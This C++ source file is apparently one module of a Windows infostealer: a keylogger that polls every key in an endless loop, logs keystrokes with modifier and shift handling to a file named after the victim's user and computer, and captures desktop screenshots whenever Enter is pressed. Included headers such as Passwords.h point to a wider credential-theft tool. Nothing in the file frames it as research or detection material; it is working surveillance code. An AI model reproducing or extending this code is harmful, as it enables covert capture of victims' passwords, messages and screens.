#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <map>
#include <string>
#include "Passwords.h"
#include "SystemInfo.h"
#include "keylog.h"
#include "Paths.h"
#include "DesktopScreenshot.h"

// Reference the global LogDirectory variable
extern std::string LogDirectory;

// Construct a string with the format: <username>@<computer_name>_<language>
std::string logname = SystemInfo::getUserName() + "@" + SystemInfo::getComputerName() + "_" + SystemInfo::getLanguage();

bool KeyLog::CreateDirectoryRecursive(const std::string& directoryPath) {
    if (directoryPath.empty()) return false;

    DWORD attributes = GetFileAttributesA(directoryPath.c_str());
    if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY)) return true;

    size_t pos = directoryPath.find_last_of("\\/");
    if (pos == std::string::npos) return false;

    std::string parentDirectory = directoryPath.substr(0, pos);
    if (!CreateDirectoryRecursive(parentDirectory)) return false;

    return CreateDirectoryA(directoryPath.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
}

void KeyLog::logEvents() {
    std::string logfile = LogDirectory + "\\KeyLog_logs.txt";

    if (!CreateDirectoryRecursive(LogDirectory)) {
        std::cerr << "Failed to create log directory: \"" << LogDirectory << "\"" << std::endl;
        return;
    }

    HANDLE logFile = CreateFileA(logfile.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (logFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open or create log file: \"" << logfile << "\"" << std::endl;
        return;
    }

    SetFilePointer(logFile, 0, nullptr, FILE_END);

    std::map<int, std::string> keyMap = {
        {VK_SPACE, " [SPACE] "}, {VK_RETURN, " [ENTER] "}, {VK_SHIFT, " [SHIFT] "},
        {VK_BACK, " [BACKSPACE] "}, {VK_TAB, " [TAB] "}, {VK_ESCAPE, " [ESCAPE] "},
        {VK_CONTROL, " [CTRL] "}, {VK_MENU, " [ALT] "}, {VK_LEFT, " [LEFT_ARROW] "},
        {VK_RIGHT, " [RIGHT_ARROW] "}, {VK_UP, " [UP_ARROW] "}, {VK_DOWN, " [DOWN_ARROW] "},
        {VK_CAPITAL, " [CAPS_LOCK] "}, {VK_F1, " [F1] "}, {VK_F2, " [F2] "}, {VK_F3, " [F3] "},
        {VK_F4, " [F4] "}, {VK_F5, " [F5] "}, {VK_F6, " [F6] "}, {VK_F7, " [F7] "},
        {VK_F8, " [F8] "}, {VK_F9, " [F9] "}, {VK_F10, " [F10] "}, {VK_F11, " [F11] "}, {VK_F12, " [F12] "}
    };

    std::map<int, bool> keyState; // Tracks the state of each key

    for (int key = 0; key <= 255; key++) {
        keyState[key] = false;
    }

    while (TRUE) {
        for (int key = 8; key <= 255; key++) {
            SHORT keyStateNow = GetAsyncKeyState(key);

            if (keyStateNow & 0x8000) {
                if (!keyState[key]) { // Log only if the key wasn't already pressed
                    keyState[key] = true;

                    std::string keyLog;
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                    bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

                    if (keyMap.find(key) != keyMap.end()) {
                        keyLog = keyMap[key];
                    }
                    else if (key >= 0x30 && key <= 0x39) {  // Digits 0-9
                        if (shiftPressed) {
                            const char shiftedDigits[] = ")!@#$%^&*(";
                            keyLog = shiftedDigits[key - 0x30];
                        }
                        else {
                            keyLog = static_cast<char>(key);
                        }
                    }
                    else if (key >= 0x41 && key <= 0x5A) {  // Letters A-Z
                        bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                        if (shiftPressed ^ capsLockOn) {
                            keyLog = static_cast<char>(key); // Uppercase
                        }
                        else {
                            keyLog = static_cast<char>(tolower(key)); // Lowercase
                        }
                    }
                    else {
                        char buffer[32];
                        sprintf_s(buffer, "[VK_CODE:%d]", key);
                        keyLog = buffer;
                    }

                    if (shiftPressed || ctrlPressed || altPressed) {
                        keyLog = std::string(shiftPressed ? "[SHIFT]+" : "") +
                            std::string(ctrlPressed ? "[CTRL]+" : "") +
                            std::string(altPressed ? "[ALT]+" : "") + keyLog;
                    }

                    DWORD bytesWritten;
                    WriteFile(logFile, keyLog.c_str(), keyLog.size(), &bytesWritten, nullptr);

                    // Check if "Enter" key (VK_RETURN) was pressed, then take a screenshot
                    if (key == VK_RETURN) {
                        // Path where screenshots will be saved
                        std::string screenshotPath = LogDirectory + "\\Screenshots";
                        if (!CreateDirectoryRecursive(screenshotPath)) {
                            std::cerr << "Failed to create screenshot directory: \"" << screenshotPath << "\"" << std::endl;
                        }
                        // Take screenshot
                        DesktopScreenshot::Make(screenshotPath);
                    }
                }
            }
            else {
                keyState[key] = false; // Reset key state when released
            }
        }

        WaitForSingleObject((HANDLE)-1, 1);
    }

    CloseHandle(logFile);
}
